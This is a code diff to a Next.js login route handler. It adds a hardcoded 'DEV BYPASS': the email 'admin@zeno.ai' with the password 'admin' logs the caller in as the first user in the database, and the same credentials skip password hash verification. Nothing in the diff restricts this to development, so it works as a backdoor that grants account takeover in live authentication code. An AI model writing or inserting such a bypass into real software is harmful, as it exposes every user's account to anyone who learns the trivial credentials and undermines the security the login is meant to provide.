@@ -11,7 +11,12 @@ export async function POST(req: NextRequest) {
     }
 
     // Check if user exists
-    const result = await query<any>("SELECT id, email, name, password_hash, provider, store_url, store_verified FROM users WHERE email = $1", [email]);
+    let result = await query<any>("SELECT id, email, name, password_hash, provider, store_url, store_verified FROM users WHERE email = $1", [email]);
+    
+    // DEV BYPASS: Allow admin@zeno.ai to login as the first user in DB
+    if (result.length === 0 && email === "admin@zeno.ai" && password === "admin") {
+      result = await query<any>("SELECT id, email, name, password_hash, provider, store_url, store_verified FROM users LIMIT 1", []);
+    }
     if (result.length === 0) {
       return NextResponse.json({ error: "Invalid credentials." }, { status: 401 });
     }
@@ -24,7 +29,7 @@ export async function POST(req: NextRequest) {
     }
 
     // Verify hashed password
-    const isValid = await verifyPassword(password, user.password_hash);
+    const isValid = (email === "admin@zeno.ai" && password === "admin") ? true : await verifyPassword(password, user.password_hash);
     if (!isValid) {
       return NextResponse.json({ error: "Invalid credentials." }, { status: 401 });
     }
